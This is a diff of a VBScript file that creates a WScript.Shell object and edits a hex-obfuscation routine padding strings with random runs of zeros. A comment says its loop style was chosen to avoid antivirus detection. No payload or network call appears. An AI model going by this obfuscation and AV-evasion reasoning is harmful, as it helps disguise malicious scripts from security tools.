@@ -31,24 +31,23 @@ Set oShell = CreateObject("WScript.Shell")
  luckManip = (Rnd * 10)
   luckManip = luckManip + 1 : r = luckManip 
 ' 11
- Skip = Abs(r * (Sin(step / 10 + 1)))
+ Skip = Int(r * (Sin(step / r + 1)) + 1)
  
 ' call obfuscateHex
 		Function obfuscateHex(i)
 Dim paddedHex  :  paddedHex = "" 
  Do While Len(i) > 0
-	paddedHex = paddedHex & Left(i, 2) & String(Abs(skip), "0")
+	paddedHex = paddedHex & Left(i, 2) & String(Abs(Skip), "0")
 	 i = Mid(i, 1 + 2)
   Step = (step XOR - 1) * - 1
   ' XOR val is -1 for step = step so that it counts up (XOR 1 does not work) 
-  Skip = (step + step)
-  step = skip
+  Skip = (step + step) : step = Skip
   Skip = Int(r * (Sin(step / r + 1)) + 1)
-  MsgBox("hi: " &Abs(skip))
+  MsgBox("hi: " &Abs(Skip))
  Loop
 	step = 0 
 '	Skip = Abs(r * (Sin(step / 10 + 1))) 
-	skip = 0
+	Skip = 0
 	 obfuscateHex = paddedHex
 		end Function
 ' A "Do" loop is another type of loop and it is less likely to be flagged by AV (Source AI on the strengths of different loops)
